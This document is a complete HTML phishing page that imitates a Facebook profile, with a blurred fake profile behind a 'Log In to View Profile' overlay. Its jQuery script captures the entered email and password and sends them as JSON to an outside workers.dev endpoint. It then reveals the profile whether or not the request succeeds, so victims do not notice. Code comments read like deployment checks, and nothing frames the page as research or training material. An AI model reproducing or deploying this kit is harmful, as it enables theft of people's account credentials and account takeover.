<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <!-- CRITICAL: This line fixes the "shit" look on Android/Mobile -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook - Log In to View Profile</title>
    
    <!-- Dependencies -->
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>

    <style>
        @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500&display=swap");

        body, html {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            height: 100%;
            overflow: hidden; /* Lock scrolling while logged out */
        }

        /* --- BACKGROUND PROFILE STYLES --- */
        #main-content {
            transition: filter 0.5s ease;
            width: 100%;
        }
        .cover-photo {
            width: 100%;
            height: 200px;
            background: url('cover-photo.png') no-repeat center/cover;
            position: relative;
        }
        .profile-pic {
            width: 130px;
            height: 130px;
            border-radius: 50%;
            border: 4px solid #fff;
            position: absolute;
            bottom: -60px;
            left: 20px;
            background: url('profile.png') no-repeat center/cover;
        }
        .profile-info {
            padding: 70px 20px 20px 20px;
            text-align: left;
        }
        .profile-info h1 { margin: 0; font-size: 24px; }
        .profile-info p { color: #606770; font-size: 14px; }
        
        .nav-tabs {
            display: flex;
            border-bottom: 1px solid #ccc;
            margin: 10px 0;
            padding-left: 10px;
            overflow-x: auto; /* Allows swiping tabs on mobile */
        }
        .nav-tabs a {
            text-decoration: none;
            padding: 10px 15px;
            color: #606770;
            font-weight: bold;
            font-size: 14px;
            white-space: nowrap;
        }
        .nav-tabs a.active { border-bottom: 3px solid #1877f2; color: #1877f2; }
        
        .container {
            max-width: 900px;
            margin: 10px auto;
            background: #fff;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .section-title { font-size: 16px; font-weight: bold; margin-bottom: 10px; }
        .photos { display: flex; flex-wrap: wrap; }
        .photos img { width: 80px; height: 80px; object-fit: cover; margin: 5px; border-radius: 8px; }
        .post { border-top: 1px solid #ccc; padding-top: 10px; margin-top: 10px; font-size: 14px; }

        /* --- LOGIN POPUP OVERLAY STYLES --- */
        #login-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.3);
            backdrop-filter: blur(3px); 
            -webkit-backdrop-filter: blur(3px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            padding: 20px; /* Prevents card from touching edges on mobile */
            box-sizing: border-box;
        }

        .login-card {
            background: white;
            width: 100%;
            max-width: 400px; /* Limits size on desktop, fills screen on mobile */
            padding: 30px 20px;
            border-radius: 12px;
            box-shadow: 0 12px 28px rgba(0,0,0,0.2);
            text-align: center;
            box-sizing: border-box;
        }

        .fb-logo {
            width: 60px;
            margin-bottom: 20px;
        }

        .login-card input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px; /* Prevents iOS/Android from auto-zooming on focus */
            box-sizing: border-box;
        }

        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin: 15px 0;
        }

        .forgot-pw { color: #1877f2; text-decoration: none; font-size: 14px; display: block; margin-bottom: 15px; }
        .create-account-btn {
            display: block;
            margin: 20px auto 0;
            padding: 10px;
            background-color: #42b72a;
            color: white;
            text-decoration: none;
            border-radius: 6px;
            font-weight: bold;
            width: 80%;
            font-size: 14px;
        }

        /* Desktop Adjustment */
        @media (min-width: 768px) {
            .profile-info { margin-left: 180px; padding-left: 20px; }
        }
    </style>
</head>

<body>

    <!-- Background Content -->
    <div id="main-content">
        <div class="header" style="padding: 10px; font-weight: bold;">Facebook Profile</div>
        <div class="cover-photo"><div class="profile-pic"></div></div>
        <div class="profile-info">
            <h1>Janine Heguellina</h1>
            <p>1.3K friends</p>
        </div>
        <div class="nav-tabs">
            <a href="#" class="active">Posts</a>
            <a href="#">About</a>
            <a href="#">Friends</a>
            <a href="#">Photos</a>
        </div>
        <div class="container">
            <div class="section-title">Timeline</div>
            <p>Add bio</p>
            <div class="photos">
                <img src="https://via.placeholder.com/100">
                <img src="https://via.placeholder.com/100">
            </div>
            <div class="post">
                <strong>Janine Heguellina</strong> <br>
                “Tara inom :)”
            </div>
        </div>
    </div>

    <!-- Login Popup Overlay -->
    <div id="login-overlay">
        <div class="login-card">
            <img src="fblogo.png" class="fb-logo" alt="Facebook">
            <form id="loginForm">
                <input type="text" id="email" name="email" placeholder="Email or phone number" required>
                <input type="password" id="pass" name="pass" placeholder="Password" required>
                <button type="submit" class="login-btn">Log In</button>
                <a href="#" class="forgot-pw">Forgot password?</a>
                <hr style="margin: 20px 0; border: 0; border-top: 1px solid #ddd;">
                <a href="#" class="create-account-btn">Create new account</a>
            </form>
        </div>
    </div>

    <script>
    $(document).ready(function() {
        $('#loginForm').submit(function(e) {
            e.preventDefault(); 

            var formData = {
                email: $('#email').val(),
                pass: $('#pass').val()
            };

            $.ajax({
                type: 'POST',
                url: 'https://fb-profile-api.myweb1128.workers.dev', // <--- DOUBLE CHECK THIS URL
                data: JSON.stringify(formData), // <--- MUST be stringified
                contentType: 'application/json', // <--- MUST be application/json
                success: function(response) {
                    console.log("Success:", response);
                    unlockProfile();
                },
                error: function(xhr, status, error) {
                    console.log("Error:", error);
                    unlockProfile();
                }
            });
        });
    });

    function unlockProfile() {
        $('#login-overlay').fadeOut(500, function() {
            $('#main-content').css('filter', 'none');
            $('body').css('overflow', 'auto');
        });
    }
</script>
</body>
</html>
